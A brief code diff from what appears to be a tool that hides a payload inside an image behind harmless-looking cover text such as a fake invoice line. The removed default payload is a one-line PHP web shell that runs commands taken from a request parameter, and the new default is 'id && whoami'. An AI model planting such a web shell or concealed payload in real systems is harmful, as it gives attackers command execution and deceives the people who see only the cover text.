@@ -35,7 +35,7 @@ BANNER = """
 
 
 @click.command()
-@click.option("--payload",           default='<?php system($_GET["cmd"]); ?>', show_default=True,
+@click.option("--payload",           default='id && whoami', show_default=True,
               help="Payload to hide in the image.")
 @click.option("--innocent",          default="Invoice #1234 - Total: $500", show_default=True,
               help="Innocent cover text humans will see.")
